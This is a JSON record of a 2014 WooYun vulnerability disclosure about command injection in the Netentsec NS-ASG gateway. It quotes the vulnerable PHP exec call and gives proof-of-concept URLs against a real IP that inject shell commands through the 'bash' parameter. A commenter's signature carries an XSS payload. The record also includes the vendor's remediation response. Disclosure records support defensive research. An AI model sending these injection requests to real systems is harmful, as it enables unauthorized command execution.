{"id": 2580, "wybug_id": "wooyun-2014-058925", "wybug_title": "网康 NS-ASG 应用安全网关所有版本任意命令执行可getshell", "wybug_corp": "网康科技", "wybug_author": "倪明", "wybug_date": "2014-04-30 11:52", "wybug_open_date": "2014-07-29 11:54", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 网康 NS-ASG 应用安全网关所有版本任意命令执行可getshellso easy。。。 详细说明：  \ncase \"restartservice\":\t$command = \"sudo /etc/init.d/\".$bash.\" stop\";\texec($command);\t$command = \"sudo /etc/init.d/\".$bash.\" start\";\texec($command);\tredirect(\"list_logfile.php\");\tbreak;\n好逗，用“;”号隔开，直接可以执行任意命令 (￣◇￣;)\nhttps://202.113.20.208/debug/list_logfile.php?action=restartservice&bash=;echo test >/Isc/third-party/httpd/htdocs/test.txt;\n   漏洞证明：  \n\n同样，写shell也可以执行系统命令可以写入文件来看返回结果\nhttps://202.113.20.208/debug/list_logfile.php?action=restartservice&bash=;whoami >>/Isc/third-party/httpd/htdocs/test1.txt;\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 倪明@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 22:03 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 2014-07-17：已通过补丁解决  ", "replys": "漏洞评价：\n评论\n     2014-04-30 11:52 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  靠    \n     2014-04-30 11:54 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  还来    \n     2014-04-30 11:54 |    \t\tz7y丶 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 我是z7y的表弟)\t\t \n  碉堡～    \n     2014-04-30 11:57 |    \t\t倪明 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:13        | 倪明，中关村二小)\t\t \n  @wefgod 偶像哥哥    \n     2014-04-30 12:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @倪明 别，我打酱油的。你这些才牛逼啊    \n     2014-04-30 12:01 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  网康，我想说你怎么了，占满了整个乌云。    \n     2014-04-30 12:12 |    \t\t倪明 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:13        | 倪明，中关村二小)\t\t \n  @wefgod T_T    \n     2014-04-30 12:34 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  @wefgod 你很牛逼的    \n     2014-05-05 10:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @GrayTrack @倪明 真的打酱油的，你看现在一个漏洞都挖不了，哈哈    \n     2014-08-08 15:47 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  原来这样也可以    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}